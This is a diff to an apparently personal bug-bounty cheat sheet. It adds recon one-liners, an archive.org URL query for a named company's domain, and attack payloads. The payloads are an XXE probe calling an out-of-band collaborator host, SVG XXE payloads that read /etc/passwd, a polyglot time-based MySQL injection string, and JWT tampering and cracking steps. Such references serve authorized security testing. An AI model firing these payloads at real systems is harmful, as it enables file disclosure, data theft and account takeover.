@@ -67,15 +67,13 @@ Putting this here as I always forget it :)
 
 ```
 
-
-**Grepping Root Subdomains From File**
+** Pull Root Subdomains from Final.txt** 
 
 ```powershell
-
-
-echo http://aidan.aidan.es-us.aidan.test.test..aidan.news.yahoo.com | rev | cut -d . -f 2-4 | rev
-
+cat final | rev | cut -d . -f 1-3 | rev | sort -u | tee root.subdomains
 ```
+
+
 
 
 **Port Scanning IP Ranges**
@@ -763,6 +761,18 @@ When EyeWitness runs it will save the source of the URLs it screenshots inside t
 cat subdomains | waybackurls > urls
 ```
 
+#### Archive.org Direct URL Access - Really Good
+
+```powershell
+http://web.archive.org/cdx/search/cdx?url=*.visma.com/*&output=text&fl=original&collapse=urlkey
+```
+
+#### GetAllURL's
+
+```powershell
+Bash alias already created in profile on VPS - getallurls or getallurlsloop
+```
+
 
 
 #### Tomnomnom's Concurl
@@ -1193,6 +1203,8 @@ There is a awesome list of dorks located here
 Its very common for devs to accidently push  
 ```
 
+<img align = "center" src="https://miro.medium.com/max/1024/0*ddmcCZ14kuMdHBPC.png">
+
 
 #### GitMiner
 
@@ -1336,10 +1348,12 @@ x-jenkins 200
 
 XML is essential a language designed to transport data in a structured format, ,similar to JSON.
 
+Basic XXE Check
+
+<?xml version="1.0" encoding="utf-8"?><!DOCTYPE data SYSTEM "http://123123123.burpcollaborator.net/m0chan.dtd"><data>&all;</data>
+
 XXE is a vuln that occurs when an application parses XML. 
 
-
-Essentially there are something called ENTITYs within XML that really acts as a var that be called, something like
 
 <?xml version="1.0"?>
 <!DOCTYPE note [
@@ -1548,6 +1562,18 @@ SSRF
 </methodCall>
 ```
 
+#### XXE File Upload SVG
+
+```powershell
+#https://0xatul.github.io/posts/2020/02/external-xml-entity-via-file-upload-svg/
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<svg>&xxe;</svg>
+
+<?xml version="1.0" encdoing="UTF-8" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]><svg width="512px" height="512px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="14" x="0" y="16">&xxe;</text></svg>  
+
+```
 
 
 
@@ -1566,21 +1592,28 @@ WAF evasion if any.
 ```
 
 
+#### Ultimate MySQL Injection Payload (Detetify)
 
+```sql
+#https://labs.detectify.com/2013/05/29/the-ultimate-sql-injection-payload/
 
+IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR"*/
 
-
-#### XXE File Upload SVG
-
-```powershell
-#https://0xatul.github.io/posts/2020/02/external-xml-entity-via-file-upload-svg/
-
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
-<svg>&xxe;</svg>
-
-<?xml version="1.0" encdoing="UTF-8" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]><svg width="512px" height="512px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="14" x="0" y="16">&xxe;</text></svg>  
 
 ```
 
+#### JWT Exploiting
+
+```powershell
+#https://github.com/wisec/OWASP-Testing-Guide-v5/blob/master/Testing_for_APIs.md
+
+Full details above.
+
+1) Access JWT Debugger too base64 decode and ensure that nothing sensitive is being transferred. Make sure no PII is being transferred etc.
+	2) Try chang esome values and obtain IDOR, like `id` or `isAdmin`
+	3) Modigy ALG attribute, set HS256 to null
+
+
+4) JWT Crack - https://github.com/brendan-rius/c-jwt-cracker - Secret used to encrypt tokens may be weak.
+```
 
